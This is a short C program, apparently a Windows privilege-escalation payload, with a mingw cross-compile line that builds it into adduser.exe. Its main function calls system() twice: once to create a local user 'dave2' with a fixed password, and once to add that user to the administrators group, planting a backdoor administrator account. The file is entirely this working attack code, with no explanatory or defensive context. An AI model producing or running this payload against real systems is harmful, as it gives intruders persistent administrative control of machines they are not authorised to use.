#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}

// Compile: x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
